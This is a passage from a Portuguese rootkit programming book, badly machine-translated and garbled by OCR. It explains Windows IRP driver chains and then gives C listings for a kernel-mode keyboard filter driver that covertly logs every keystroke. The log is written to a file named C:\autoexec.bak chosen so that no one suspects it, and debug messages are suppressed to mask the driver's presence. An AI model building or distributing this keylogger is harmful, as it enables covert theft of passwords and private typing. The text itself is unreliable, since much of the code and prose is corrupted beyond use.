dispositivos.O dispositivo principal é o controlador de teclado 8042. 
Nosso motorista (raiz) é o superior na corrente: funciona com seu próprio 
dispositivo /dispositivo /sniffer. 
Vamos descobrir como a cadeia de dispositivos processa informações.Antes 
No total, uma solicitação de leitura que a chave é enviada - o IRP é formado.IRP 
começa sua jornada pela corrente do dispositivo até chegar 
Controlador 8042. Cada dispositivo pode modificar o IRP ou 
Uma vez diferente, reagir ao IRP. 
Quando o usuário pressiona a tecla, o driver 8042 você
Resolve as seguintes ações: 
• 
recebe um código de varredura de uma tecla pressionada do buffer do teclado; 
• 
Coloca o código de varredura da chave no IRP; 
• 
Transmite o IRP com o código de varredura "UP". 
172

pagina: 172

Capítulo 6. Revival no nível do núcleo 
Rutkin (teclado 
FAREJADOR) 
Classe "KBDClass" (classe 
drivers de teclado) 
O motorista da porta do teclado 
(I8042PRT) 
Uma cadeia de motoristas 
/Dispositivo/sniffer 
EU 
/Dispositivo/keyboardclasso 
1 ' 
(sem nome) 
Grupo 
dispositivos 
Controlador de teclado 
8042 
Arroz.6.6.Correntes de motoristas e dispositivos 
Enquanto o IRP move a cadeia de motoristas, todo motorista pode
Direcioná -lo. 
Antes de considerar a próxima edição, deixe -me 
Recomenda a você o programa DeviceTree que exibe a árvore de motoristas 
Dispositivos - Uma ferramenta muito útil no desenvolvimento de vários níveis 
Drivers de dispositivos.O programa pode ser baixado do site www.Osronline.Com. 
É verdade que o registro gratuito é necessário para baixar o programa. 
6.5.2.IRP e pilha de entrada/saída 
Pacotes IRP, cuja transferência do despachante de entrada/saída está no comando.
são para a troca de dados entre o programa do usuário e a unidade
Rum, bem como transmitir informações oficiais entre os motoristas. 
Infelizmente, a estrutura do IRP está apenas parcialmente documentada.Algo 
É descrito em detalhes na documentação oficial da Microsoft, algo não é 
Muito, mas algo não é descrito. 
Os drivers de vários níveis de um dispositivo formam uma corrente.No 
Implementação de uma solicitação de entrada/saída para um driver de vários níveis para
O pacote IRP é lavado no mundo, que será transferido para todos os motoristas da cadeia. 
173

pagina: 173

Rootkits
O primeiro recebe o motorista do IRP do mais alto nível, em pé na corrente para
você m.O último driver da cadeia desempenha funções de baixo nível.
Ele recebe o IRP por último.
Arquivo
Visualizar
£ e & rch
JDS
Ajuda
Yshg ° \ £ t1
H
DRV No.* W
J * j
E.
B.
Dhv \ dr (v "wm"
º
Drv \ drivet \ drnload
9
Drv \ dr "\ fdc
9
Drv \ drivcf \ fetn01sb
•
Drv \> iver \ flps
W - drv ^iViftTtsk
: •.
Dfw \ driver \ gpc
3
Drv \ dnver \ imh2prt
& •
Dev (sem nome)
Att ycwvice^eytaardcsasio
@ • Dev (sem nome)
Att \ i> evit*: \ pwntetClassfl
Sch
Drv \ dnvei \ trrwp "
Sch
Drv \ 0.w »i \ tpfiterdriver
1
Drv \ a-IV "\ jps":
!*!
Drv \ orh <er \ isapnp
EM
Drv \!> Pvery;
P
Drv wwrtrv*
EM
Drv \ driverv <jmc
EM
Drv \ dwer \ kmi*er
3
Drv \ dfwervk5ecdd
Sh
Drv \ driver \ mnmdri
Não.
Drv \ c*tv \ modem
EM
Drv \ drivcr \ moudks
a
D R V \ Dwer \ MountMgr
$
Drv \ driver \ ndi5
Não.
Drv \ ofivei \ ndstepi
EM
Drv pnver \ nuisuo
";
Drv tprtwvttfew*)
*
Drv \ dt*v "r \ noproyy
*EU
Drv iDrwwwww
•
Drv \ dtiverv*j
Sh
Drv \ dtwervw
E.
B.
Drv \ dwei \ objimfo
a
DRV No.rtrttvwport
3
Drv \ driver \ PartMgr
EU
Drv \ drrver \ pa-vdm
a
Drv \ onver \ pcl
Sh
Drv \ driver \ pnpm <VW> g "
, Assim,
LoadAodresi
Oirver Sizr.
HANDE TRIBUNAL.
Referências'
Altnbur.es
Duvet Ors!:
Tabela de expedição de fastlo,
Pornô de entrada de slartlo
Adicione o punt de entrada do dispositivo:
Fiagr
.:
Serviço heme;
) EVICE (.KL
Dispositivo hstae
(Sem nome
(Uncrived!
<l
Ajuda da panela, pressione f = l
.^
..
Hi'ylgshzrgt
B> "B210SB
50kb
T
E (JNQ Uniwis
.0x61 4caca8
Itmoasoo '™
BRF3S218CF
i3xf982 №1c "~
Ili-gacyjj'rmr
Sssprt ""
S Objeto do dispositivo
|Alças
Ck814kjad3
SOBRE
0x81458C33
0
Código da função Vlara "Suportado:
IRP MJ Criar
- J.
IRP MJ Fechar
IRP MJ Buffers de descarga
Controle de dispositivo IRP MJ
~*
Irp_mjjn!
, j
"Ostlo Entry Pont" suportado.
Jntoadruseeaddress:
6^9B27C08
!Phs j rets
!Apegado!FSD
4
0
(W 4.
0*000000
4
0
0*614 ..
0*000000
.-J s i x]
-D
Sh
• m l
Wa
Aberto S.
você
Itens Rt
105 Rota 101a
Amherst.NH 030
PH 1603) 595-65
Fa* [sg3) 595-65
Vervzis
http^/www.esr.c
OEEVEBPN Custom
5err »Nars, 'Ind BOT
_
h
J.
± t
IMJM J.
Arroz.6.7.Programa de árvore de dispositivos em ação
Cria um gerenciador de entrada/saída IRP.Durante a criação do IRP, ele é
divide o número de motoristas na corrente e adicionando para cada motorista
o espaço adicional no IRP Este espaço é chamado
Io_stack_location.Segue -se que o tamanho
O IRP depende do número de motoristas e não é constante.
A estrutura do IRP é mostrada na FIG.6.8.
O que é armazenado em um IRP-post?Eu acho que é fácil adivinhar.
Em primeiro lugar, o índice atual da matriz lo_stack_location.Em segundo lugar,
O ponteiro para o elemento atual io_stack_location.Deve -se notar que
A numeração dos elementos da matriz io_stack_location começa com 1 e
Não há um elemento zero.
Suponha que em nosso IRP existem três elementos io_stack_location, então
Existem apenas três motoristas em nossa cadeia.Ao criar um índice de matriz IRP
será 3, e o ponteiro indicará o terceiro elemento da matriz - em
174

pagina: 174

Capítulo 6. Revival no nível do núcleo
I0_stack_location para o primeiro motorista em uma corrente, ou seja, o motorista para
o nível de salgueiro.Você já percebeu que um elemento de uma matriz correspondente
Este motorista está localizado, pelo contrário, o último?Agora você vai entender
Por que é isso.
Título SR
Io_stack_lociton
(para o motorista "baixo")
Io_stack_location
(Para
você mesmo
"Alto"
Drivers)
Arroz.6.8.Estrutura do IRP
Ao transmitir um motorista de nível inferior IRP do nível mais alto
Chama a função icalldriver.Função
Iocalldriver é o primeiro
O caso reduz o índice da pilha de entrada/saída.Portanto, o motorista
O nível mais baixo recebe IRP com um índice já instalado, é
GO não precisa ser feito, basta usar o elemento indicado no cabeçalho
Índice IRP.
Quando o último motorista da cadeia receber IRP, o índice de massa será
Instalado em 1. Se instalado em 0, o sistema entrará em colapso.
O filtro de motorista, que será o nosso ajuste do teclado, deveria
Mantenha as principais funções dos motoristas.O filtro mais simples que
não faz nada além da transferência de todo o IRP para o próximo nível, deveria
Basta registrar -se como um manipulador de qualquer função IRP
Mypassthru.Aqui está um fragmento de sua função de motorista:
for (int i = 0; i <irp_mj_maximum_functions; i ++)
pdriverbject-> majorfunção [i] = mypassthru;
E o único objetivo da função do tiro MyPasshru é
Para transmitir mais o IRP:
Ntstatus mypassthru (pdevice_object currentEviceObject,
PIRP PLRP)
(
IoskipcurentlrpStackLocation (PLRP);
Retornar icalldriver (currentDeviceObject-> NextDevice, PLRP);
}
175

pagina: 175

Rootkits 
A função ioskipcurrentlrpstacklock aumenta em 1 ponteiro 
o elemento atual para que a função Localldriver possa reduzi -la 
1 e obtenha o próprio elemento que era atual ao ligar 
Ioskipcurentlrpstacklocation. 
Lembre -se de que o ioskipcurrentlrpstackloocation é anunciado como macro, 
Portanto, nos ciclos, nos operadores da transição condicional, você deve 
Use suportes encaracolados: 
/ / funciona 
se 
(doença) 
{ 
IoskipCurrentLrpStackLocation (); 
} 
// não funciona 
if (condição) ioskipCurrentLrpstacklock (); 
176

pagina: 176

Capítulo 7. Escrevemos 
Farejador 
Teclado 
• 
Registro do filtro do teclado 
• 
Lançamento de um fluxo separado, 
Protocolamento Pressionamento 
Chave 
• 
Teclado de processamento de IRP 
• 
Gravar chaves interceptadas em 
ARQUIVO 
• 
Montagem de sniffer 
• 
Teclados prontos -feitos 
Rootkits

pagina: 177

Neste capítulo, escreveremos um sniffer simples do teclado.Com o objetivo de 
Nossa simplificação de código de sniffer só entenderá o alinhamento em inglês
Ku.Você pode finalizá -lo independentemente antes que o apoio da língua russa seja 
Será seu primeiro dever de casa. 
Antes de começar, deixe -me lembrá -lo de que as teclas
Eles são editados na forma de códigos de varredura, não símbolos.Para converter o código de varredura 
Você precisará executar determinadas ações no símbolo, e não imediatamente 
Registre as informações recebidas no arquivo. 
Então, vamos começar com a função do motorista.Primeiro de tudo, deve estabelecer
Função Vit "através", que será chamada de keypshru.Então 
Ela registra consultas IRP para leitura do teclado KeyRead 
e cria uma cadeia de Hookkbrd em uma corrente,
O motorista estará envolvido no motorista: 
para 
(I n t i = 0; i <irp_mj_maximum_functions; i ++) 
P D R I V E R O B J E C T -> M A J O R F U N C T I O N [I] 
= Keypastrhru; 
pdriver-> majorfunction [irp_mj_read] = keyread; 
Hookkbrd (PdriverObject); 
7.1.Registro do filtro do teclado 
O novo dispositivo também será um teclado.É descrito pela estrutura 
Device_Extension: 
Typedef Strect _Device_Extension 
{ 
Pdevice_object 
PKEYBOARDDEVICE; 
Pthread pthreadage; 
Bool 
BHTHReadTerminate; 
Manuseie o hlogfile; 
178

pagina: 178

Capítulo 7. Escreva o teclado para o teclado 
Key_state k s t a t e; 
Ksemaphore Semqueue; 
Kspin_lock Lockqueue; 
List_entry Queuelisthead; 
Extensão do dispositivo, *extensão pdevice; 
As bandeiras do novo dispositivo devem ser instaladas idênticas às bandeiras 
O dispositivo principal do teclado.Você pode ver as bandeiras usando 
Programas DeviceTree (Fig. 7.1).A função Hookkbrd é dada em 
Listagem 7.1. 
"2.ia-ohv" v "" -o "4oevimi^0rtv" "|> rasgou> <: '' 
j e j * eu 
Fjte 
Visualizar 
Geerch 
Ids fcjelp 
iiijf5 \ ej! 
Drv \ drivei- \ acpl 
Drv \ diiw \ acpi_nat 
Orv \ 0weia #blooe.w.l 
Drv \ d.wer \ afd 
Drv \ c.vei \ amdk7 
Orv idnvw \ akp.dll 
DRV KZHELDVUPSMK 
Drv \ oiwer \ atepi 
Drv \ l4iv4i \ idstub 
Drv \ driverl, seja No. 
Drv \ d »ivef \ cdrom 
Orv \ drwer \ conrtw, dli 
Drv \ driver \ dtsk 
Drv \ otwerwm »o 
ORV 'IDRIVERWMLQJRI 
Orv \ oriver \ dnsscftce, dll 
Orv w w r t l v * 
Orv '(Diwer \ f -tnd] 5b 
Orv 
\ Oriwr \ r \ ps 
Orv \ owraptdi5k 
Orv '| 
Orv \ c4-tver \ gpc 
Orv \ orivmhtmlfilt.dll 
Orv \ oivet \ hnpfilt.dll 
Orv \ 0RIVER \ IE0! 
Drv \ oriver \ it-1Apfilt.dll 
Drv \ & river \ ifnapi 
Drv \ orivertfpfetdfiver 
Drv \ oover \ ip5ee 
DRV WWWRTIMPNP 
Drv y> r/er \ kbdda " 
Dev \ oevice \ k*ybosrdaaj 
Dev \ Devjce \ Keybsardaa: 
Drv 
\ Drwrty.tf 
Drv \ ower \ kfoc 
Drv \ dr (ver \ kmixer 
Drv \ r> rvey.s*cdo 
Drv \ dnver \ ma! 
Orv \ onver \ mnmdd 
J. 
Motorista Heme: 
Objeto de dispositivo 
Objeto orivw 
Próximo dispositivo: 
Contagem de alças: 
Contagem de ponteiros: 
Tempo de criação; 
Dispositivo anexado; 
Tote'jmfled.davfci 
\ 0 "Viraskeyboardcjassq 
Jsdfivei & bdciass 
Yit459^0 "" 
0>: oooooqoo 
; 
Gbhooooshm 
: y: 
Fs 
Dispositivo: 
Dispositivo tjipe 
Tamanho da pilha: 
.10x00000 
Typ^lrll.device.kev^oard 
Importância do DPC: 
Jovo 
Rotina DPC: 
JFT*00W000 ' 
Número do OPE: 
"• '| 0k0 
Chatac-lentfics; 
Jftrfj 
Bandeiras:: '.: 
Fietcicoces. 
T UP 
£ x2044 
Yukhosooooo '' 
J ID da instância: 
Eu vendtx: 
JH "DW" EFDS 
Capacidades do dispositivo: 
G 
DeViedi 
G 
DeWED2 
V-} 
•) 
Locksuppored 
G "Eiects 
Elevada 
G 
DockQevfce 
r t l n k j g e i o 
G 
Removível 
: G 
RawPeviceok 
: G 
Suipiseremova 
G 
Sttentfnstai 
G 
Wakefromdo 
G 
Wakefiomol 
G 
Wakefiofr, D2 
G 
Wakefiom03 
F 
Hardwsredtsebled 
G "Nondynamie.: 
G "waimeieclsupooite; 
G 'nootsptayfnui 
[Sydemwak* 
!, D1 depois. 
J: D2LAIEW 
Deytcewafce; 
D3LATENCY: 
EU 
^ 
Arroz.7. J. DeviceTree: Veja informações sobre sinalizadores 
Motoristas 
Listagem 7.1.Instalação do filtro do teclado 
Ntstatus hookkbrddn pdriverjdbject pdriverobject) 
/ / filtro do objeto de dispositivo 
PDEVICEJDBJECT PKEYBOARD; 
Ntstatus s t a t u s; 
/ / crie um objeto do dispositivo de teclado 
s t a t u s = 
I c r e t e d e v i c e (p d r i v e r o b j e c t, 
Sizeof (extensão do dispositivo), nulo, 
179

pagina: 179

Rootkits 
File_device_keyboard, 0, true, PKeyboard); 
// convence que o dispositivo é realmente criado 
if (! nt_success (status)) status de retorno; 
// Defina as bandeiras 
Pkeyboard-> sinalizadores = 
Pkeyboard-> sinalizadores i (do_buffered_io i 
Do_power_pagable); 
PKEYBOARD-> sinalizadores = PKeyboard-> sinalizadores & ~ do_device_initializing; 
// Inicialize a estrutura de Device_Extension. 
// primeiro redefinir 
Rtlzeromemery (PKEYBOARD-> Devicextance, 
Sizeof (device_extension)); 
Pdevice_extension pKeyboardExtension = 
(PDevice_Extension) PKeyboard-> DeviceExtension; 
// nosso dispositivo na cadeia de dispositivos estará localizado 
// acima do dispositivo de teclado (nome no unicode). 
// Instale o filtro com uma chamada ioattachdevice 
Cchar nameBuffer [64] = "\\ dispositivo \\ keyboardclasso"; 
Nomestring de string; 
Unicode_string keyboarddevicename; 
Rtllnitansistring (Snamestring, NameBuffer); 
RtlansistringTounicodestring (& ClassDDevicename 
Snamestring, verdadeiro); 
Ioattachdevice (pkeyboard, 
SKEYBOARDDEVICENAME, & PKEYBOODEXTENMENSÃO-> PKEYBOARDDEVICE); 
Rtlfreeunicodestring (ukeyboardDevicename); 
Dbgprint ("Anexando o dispositivo de filtro ... ok \ n"); 
Retornar status_success; 
} // Hookkbrd 
7.2.Lançamento de um protocolamento de fluxo separado 
Klovis pressiona 
Vamos voltar à nossa função de motorista.Depois de instalar uma armadilha para 
Teclado, precisamos inicializar o fluxo para gravar prensas 
A chave do arquivo.Como esse prazer é bastante volumoso, vamos organizar 
Está na forma da função initkeysnif f er (Listagem 7.2). 
Listagem 7.2.Função initkeysniffer 
Ntstatus initkeysniffer (em pdriverjdbject pdriverobject) 
{ 
// Device_Extance Pointer é usado para 
// inicialização de alguns membros da estrutura 
Pdevice_extension pKeyboardExtension = 
(Extensão do PDevice) Pdriver-> DeviceObject-> Devicextance; 
180

pagina: 180

Capítulo 7. Escreva o teclado para o teclado
// O estado das teclas de protoculação do fluxo,
// Vamos armazenar no BTHReadTerminE
pkeyboardExtension-> bfhreadMerminate = false;
// Crie um fluxo
Manusear hthread;
Ntstatus statatus = pschesystemthread (shthread,
(Access_mask) 0,
Nulo, (alça) 0,
NULL, LOGKESTHREAD,
Pkeyboardextension);
if (! nt_success (status)) status de retorno;
// pegue o ponteiro para o objeto do fluxo
ObreferênciaoObjectByHandlef hthread, thread_all_access,
Nulo, kernelmode,
(Pvoid*) spokeboardextension-> pthreadobj, null);
// não precisamos mais de um descritor de fluxo
Zwclose (hthread);
Status de retorno;
}
Como você pode ver, não há nada complicado nas funções do initkeysnif Fer: nós apenas
Criamos um fluxo que interceptará as teclas das teclas.Protoco
A função LogKeySthread estará aprendendo as teclas em si, mas sobre isso
Mais tarde.
Voltamos ao motorista novamente.Teclas de manobra, especialmente quando alguém
Rapidamente ganha o texto, são um fluxo contínuo de códigos de varredura.
Para seu armazenamento, precisamos de uma lista coerente.Vamos criá -lo:
Pdevice_extension pKeyboardExtension =
(PDevice_Extension) Pdriver-> DeviceObject-> Devicextance;
Initializelisthead (spkeyboordExtension-> Queuelisthead);
Agora, lidaremos com a sincronização do acesso a esta lista.Para synchroni
Sucorações, devemos usar spinlock (spinlock) - mecanismo,
usado pelo núcleo Windows NT para garantir um mutuamente exclusivo
Acesso às estruturas globais do sistema.Se não o fizermos
Use bloqueio mútuo (este é outro spinlock de nome), depois arrisque
Eu posso ver a tela de morte azul quando dois fluxos tentarão ao mesmo tempo
Obtenha acesso a uma lista coerente.
Kelnitializespinlock (SpKeyboordExtension-> Lockqueue);
KelnitializeMaphore (& PKeyboardExtension-> Semqueue, 0, Maxlong);
Depois disso, começaremos a criar o arquivo de protocolo - estaremos nele para
Veja as teclas interceptadas.Vamos chamá -lo com: \ autoexec.Bak.
Por que é?E para que ninguém adivinhe.Por um lado,
Renia .Bak não causará suspeita e, por outro lado, nosso arquivo não será
181

pagina: 181

Rootkits
REALLELED por um editor de texto, pois no arquivo Windows 2000/XP
AutoExec.O morcego não é usado.
File_stat;
Wdosdevices wautooexec .bak ''
Verdadeiro);
Io_status_block
Object_attributes
Attr;
Cchar
Nomefile [64] =
Corda
Namestring;
Unicode_string
Nome do arquivo;
Rtllnitansistring (Snamestring, Nomefile);
RtlansistringTounicODestring (sfileName, Snamestring,
InitializeObjecttttributes (SATTRIB, SFILENAME,
Obj_case_insensitive, nulo, nulo);
Status = zwcreatefile (spkeyboardextension-> hlogfile,
Geneeric_write,
SATTRIB,
Sfile_stat,
Null, file_attribute_normal, 0,
File_open_if, file_synchrons_io_nonalert,
Nulo, 0
Rtlfreeunicodestring (sfilename);
if (status! = status_success)
{
Dbgprint
("Não é possível criar arquivo de log ... \ n")
;
Dbgprint ("status = %x \ n",
file_stat);
Outro
/ / arquivo é criado com sucesso, não exibimos nenhuma mensagem de depuração
/ / para mascarar
/ / Dbgprint ("Criando arquivo ... ok \ n");
Nós praticamente escrevemos a função de motorista.Tudo o que resta para nós é
Registre a função causada ao descarregar o driver da memória:
pdriverbject-> driverUnload = snifferunload;
Retornar status_success;
A função Snif F Erunload é fornecida na Listagem 7.3.
Listagem 7.3.
Função snifferunload
Void snifferunload (em pdriver_object pdriverobject)
{
// Obtenha um ponteiro para Device_Extance
Pdevice_extension pKeyboardExtension =
(Pdevice_extension)
pdriverbject-> deviceObject-> Devicextance;
// desconecte o filtro
IDETACHDEVICE (PKEYBOARDEXTENMENT-> PKEYBOARDDEVICE;
182

pagina: 182

Capítulo 7. Escreva o teclado para o teclado 
// Vamos esperar até o nosso IRP "Die" (o TTL deles será lançado) antes 
remoção 
// Dispositivos 
Ktimer Timer; 
Tempo limite large_integer; 
Timeout.quadPart = 1000.000;// 0,1 s 
Kelnitializetimer (estímulo); 
While (Numpendinglrps> 0) 
{ 
// Instale o temporizador 
Kesettimer 
(Estímulo, tempo limite, nulo); 
KewaitforsingleObject (estímulo, 
Executivo, Kernelmode, falso, nulo); 
} 
// completa o fluxo de sniffer 
PKeyboardExtension -> bthreadterminate = true; 
// Semáforo grátis 
KeleEasemaphore (SpkeyBoodExtension-> Semqueue, 0,1, verdadeiro); 
KewaitforsingleObject (PKEYBOODEXTENNENT-> PTHREADOBJ, 
Executivo, Kernelmode, falso, nulo); 
// fechar o arquivo 
Zwclose (pkeyboardextension-> hlogfile); 
// Exclua o dispositivo 
IDELETEDEVICE (PdriverObject-> DeviceObject) 
; 
Retornar; 
7.3.Teclado de processamento de IRP 
Agora considere a função KeyRead que processa irp_mj_read. 
Esta função é chamada ao processar um controlador de teclado de solicitação 
Para ler.Neste momento, o IRP ainda não contém as informações de que precisamos: 
Precisamos de IRP após a gravação da imprensa de chaves, 
Isto é, quando o IRP voltará do controlador
Viatura.Então, nosso motorista terá que registrar a conclusão
o procedimento chamando LosetCompletionRoutine, caso contrário, nós 
Não seremos capazes de usar o resultado do IRP. 
Listagem 7.4.Função KeyRead 
Ntstatus keyread (em pdevice_object pdeviceObject, no PIRP PLRP) 
{ 
Pio_stack_location currentlrpstack = 
IoGetCurrentLrpStackLocation (PLRP); 
Pio_stack_location nextlrpstack = ioGetNextlrpStackLocation (PLRP) 
*Nextirpstack = *currentIrpstack; 
183

pagina: 183

Rootkits 
// Transmitir a solicitação IRP "Down" 
IocopycurentLrpStackLocatontonext (PLRP); 
// Registre a leitura do procedimento final 
IosetCompletionRoutine (PLRP, ReadCompletion, 
Dispositivo, verdadeiro, verdadeiro, verdadeiro); 
// Aumente o contador recebido 
// esta é uma variável global 
NUMLRPS ++; 
// Passa IRP para o nível para baixo 
Retorne icalldriver (( 
(PDevice_Extension) Device-> Devicextance)-> KeyboardDevice, 
Plrp); 
) // keyread 
Após o KeyRead, é hora de fazer a função de leitura.Ela é você
É chamado quando o buffer do sistema já tem um código de varredura de Clae pressionado
Vichy e resta extraí -lo de lá.Mais precisamente, no buffer do sistema é 
Uma matriz de vários elementos - estruturas keyboard_input_data, cada
O mesmo corresponde à tecla pressionada. 
Typedef struct _keyboard_input_data { 
Ushort Unitld; 
Ushort makecode; 
Bandeiras de ushort; 
Ushort reservado; 
Ulong Extralnformation; 
) Keyboard_input_data, *pKeyboard__Input_data; 
Não levaremos essa estrutura para armazenar a chave da chave, mas definirmos 
Uma estrutura mais conveniente key_data para nossos propósitos: 
Struct key_data 
{ 
List_entry sistentry;// Posição na lista coerente 
dados de char; 
Bandeiras de acelga; 
Precisamos de outra estrutura - a estrutura do estado da chave, com
cujo poder pode ser indicado de qual dos modificadores de chaves (Ctrl, alt, 
Mudança) foram pressionados simultaneamente com ela. 
Struct key_state 
{ 
Bool Kshift; 
// turno pressionado 
Bool Kcapslock; 
// Pressione Caps Lock 
Bool kctrl; 
// Ctrl pressionado 
Bool kalt; 
// pressionando alt 
184

pagina: 184

Capítulo 7. Escreva o teclado para o teclado 
Listagem 7.5.Função de leitura 
Ntstatus readcompletionDn pdevice_object pdeviceObject, 
No PIRP PLRP, no contexto pvoid) 
( 
Pdevice_extension pKeyboardExtension = 
(PDevice_Extension) dispositivo-> Devicextension; 
if (irp-> iostatus.status == status_success) 
{ 
Pkeyboard_input_data chaves = 
(Pkeyboard_input_data) pirp-> AssociatedIrp.systemBuffer; 
// Quantas prensas de penhasco conseguiram chegar ao buffer 
int numkeys = 
Irp-> iostatus.information / 
sizeof (keyboard_input_data); 
para 
(int i = 0; i <numkeys; i 
+ 
+ 
) 
{ 
Dbgprint ("scancode: %x \ n", chaves [i] .makecode); 
se 
(Chaves [i] 
.Flags == key_break) dbgprint ("%s \ n", "tecla 
Acima "); 
if (chaves [i] .flags == key_make) dbgprint ("%s \ n", "download de chave"), 
// Copie dados do IRP para a estrutura de key_data 
Key_data* keydata = 
(Key_data*) exallocatepool (nonpagedpool, 
Sizeof (key_data) 
) 
; 
keydata-> data = (char) chaves [i] .makecode; 
keydata-> sinalizadores = (char) chaves [i] .flags; 
// Adicione a estrutura de key_data a uma lista coerente 
Exinterlockedlnserttaillist ( 
Spkeyboardextension-> Queuelisthead, 
Skeydata-> sistentry, 
& PkeyboardExtension-> LockQueue) 
; 
// aumentou o semáforo por 1 
Kereleasemaphore (SpkeyBoodExtension-> Semqueue, 0,1, falso) 
} // para 
} // se 
// Marcamos o IRP como um detido 
If (pirp-> pendente de retorno) iomarklrPpending (PLRP); 
// Após a conclusão do processamento do IRP, reduza o contador 
numlrps -; 
Retornar irp-> iostatus.status 
) // ReadComplement 
7.4.Escrevendo chaves interceptadas para um arquivo 
Por que não podemos salvar as teclas pressionadas no arquivo diretamente durante 
Função de readcompleção?Porque ela trabalha com 
185

pagina: 185

Rootkits
Prioridade IRQL igual a Dispatch_level, em que operações com FI
Lami é proibido.Portanto, a readcompição deve transferir dados em
ZaTius do fluxo de chave que criamos na inicialização do reabastecimento.
Este fluxo já escreverá informações no arquivo.Trocar esses dados
Os fluxos serão através da lista coerente comum para eles, localizada no Neva
Memória ruim (sem memória do pool de páginas N).
Listagem 7.6.LogKeyyThread Função escrevendo teclas para o arquivo
Void LogKeyyThread (no contexto pvoid)
{
Pdevice_extension pKeyboardExtension =
(Pdevice_extension) contexto;
Pdevice_Object pkeyboard =
Pkeyboardextension-> pkeyboardDevice;
// elemento da lista
Plist_entry plistentry;
List_entry sistentry;
Key_data* keydata;
// O principal ciclo de processamento dos códigos de varredura
Enquanto (verdadeiro)
{
// Esperamos dados
KewaitforsingleObject (
SpkeyboardExtension-> Semqueue,
Executivo, Kernelmode,
Falso, nulo);
Plistentry = ExinterlockedHedHedList (
& PkeyboardExtension-> Queuelisthead,
SpkeyboardExtension-> LockQueue)
;
// O fluxo do núcleo não pode ser concluído de fora.
// Terminamos por conta própria se a bandeira final
// instalado.
// Este sinalizador está instalado apenas no caso
// descarregamento do driver
if (pKeyboardDevicextance-> bThreadMerminate == true)
{
PsterMinatesystemthread (status_success);
// extraia dados da lista.
// macro contendo_record Retorna o ponteiro
// no início da estrutura de dados
Keydata = contendo_record (Plistentry,
Key_data, escuta);
// transforma o código de varredura no código-chave
CHAR KEYS [3] = (0);
Scancode2KeyCode
(PKEYBOARDEXTENNENTS,
Data chave,
Chaves)
186

pagina: 186

Capítulo 7. Escreva o teclado para o teclado 
// verifique se o código correto é recebido antes de escrevê -lo no arquivo 
Eu f (k e y s 
! = 0) 
{ 
// Registre os dados no arquivo 
if (pkeyboardExtension-> hlogfile! = null) 
{ 
Io_status_block io_status; 
Status ntstatus = 
Zwwritefile (pkeyboardextension-> hlogfile, 
Nulo, nulo, nulo, 
& Io_status, 
& Class, Strlen (Keys), 
Nulo nulo); 
} // se 
} // se 
} // Enquanto 
Retornar; 
} // logKeySthread 
Agora considere a função scancode2KeyCode.Desde que ela usa 
Personagem do escritório, então simplesmente darei sua listagem - sem comentar. 
Esta função usa as matrizes Keumar e ExtnddedkeyMap, bem como 
Várias definições (é melhor colocar essas tabelas em um título separado
Arquivo wour - códigos.h). 
Listagem 7.7.Conexão do código de varredura para o código -chave 
Void scancode2KeyCode (PDEVICE_EXTENSENTEEXION, 
Key_data* keydata, char* chaves) 
{ 
Chave de char = 0; 
Key = keumar [keydata-> keydata] 
; 
Evento Kevent = {0} 
; 
Keyboard_indicator_parameters Indparams = 
{0); 
Io_status_block iostatus = {0} 
; 
Status ntstatus = {0 
} 
; 
KelnitializeEvent (Sevente, Notificação, Falso); 
PIRP IRP = 
IobuildDevicelocontrolRolRequest ( 
Ioctl_keyboard_query_indicators, 
Devicextension-> PKeyboardDevice, NULL, 0, 
Sindparams, sizeof (keyboard_attributes), 
Verdadeiro, Sevente, Siostatus); 
Status = icalldriver (Devicextance-> pKeyboardDevice, IRP) 
if (status == status_pending) 
{ 
(Void) keyitforsingleObject (• 
187

pagina: 187

Rootkits 
Sevente, 
Suspenso, kernelmode, falso, nulo); 
} 
status = irp-> iostatus.status; 
if (status == status_success) 
{ 
Indparams = 
* 
(Pkeyboard_indicator_parameters) 
IRP-> AssociatedIrp.systemBuffer; 
IF (IRP) 
{ 
int f
eu
a
G = (Indparams.LedFlags & Keyboard_caps_lock_on) 
Dbgprint 
("Caps Lock Indicator Status: %x. \ N", 
bandeira); 
} 
outro 
Dbgprint ("Erro alocando IRP"); 
}//fim se 
trocar 
(chave) 
( 
Caso LSHIFT: 
if (keydata-> sinalizadores == key_make) 
Devicextension-> kstate.kshift = true; 
outro 
Devicextension-> Kstate.kshift = false; 
quebrar; 
Caso Rshift: 
se 
(Keydata-> sinalizadores == key_make) 
Devicextension-> kstate.kshift = true; 
outro 
Devicextension-> Kstate.kshift = false; 
quebrar; 
caso Ctrl: 
if (keydata-> sinalizadores == key_make) 
Devicextension-> kstate.kctrl = true; 
outro 
Devicextension-> kstate.kctrl = false; 
quebrar; 
caso 
Alt: 
if (keydata-> sinalizadores == key_make) 
Devicextension-> kstate.kalt = true; 
outro 
Devicextension-> kstate.kalt = false; 
quebrar; 
Espaço de caixa: 
if ((devicextension-> kstate.kalt! = true) && 
(Keydata-> sinalizadores == key_break)) 
chaves [0] - 0x20; 
quebrar; 
188

pagina: 188

Capítulo 7. Escreva o teclado para o teclado 
Caso digite: 
if ((devicextance-> kstate.kalt! = true) && 
(Keydata-> sinalizadores == key_break)) 
{ 
Chaves [0] = oxod; 
chaves [1] = oxoa; 
} 
Quebrar; 
Padrão: 
if ((devicextance-> kstate.kalt! = true) && 
(Devicextension-> Kstate.kctrl! = True) && 
(Keydata-> sinalizadores == key_break)) 
{ 
if ((key> = 0x21) && (chave <= 0x7e)) 
if (devicextance-> kstate.kshift == true) 
Chaves [0] = estendenteKeyMap [KeyData-> data]; 
Outro 
Chaves [0] = chave; 
} // se 
} // se 
Quebrar; 
} // switch (chaves) 
• // scancode2KeyCode 
7.5.Montagem de sniffer 
Sniffer já está escrito.Você tem muito trabalho agora: coletar em
O código no parágrafo anterior está juntos.Aqueles que lidam com esta tarefa
Eles podem assumir que eles não apenas sabem muito bem, mas também descobriram 
Com todo o material anterior.Neste parágrafo, tentarei você neste 
ajuda.Obviamente, foi possível trazer um completo no aplicativo 
O código -fonte, mas para os fins de seu desenvolvimento, não farei isso. 
Em primeiro lugar, quando você conecta os arquivos do cabeçalho, não se esqueça 
arquivos ntddk.h e ntddkbd.h. 
• Inclua "ntddk.h" 
• Inclua "ntddkbd.h" 
Além disso, não se esqueça do nosso arquivo de códigos, H em que é armazenado 
Informações sobre códigos de varredura. 
A variável NUMLRPS deve ser global: 
int numlrps = 0; 
Se você dividiu as funções em diferentes arquivos, não se esqueça de indicar que isso 
A variável é externa: 
189

pagina: 189

Rootkits 
NUMLRPS EXTERNO; 
Para a brevidade, usamos um novo tipo de bool, então precisa
mostrar: 
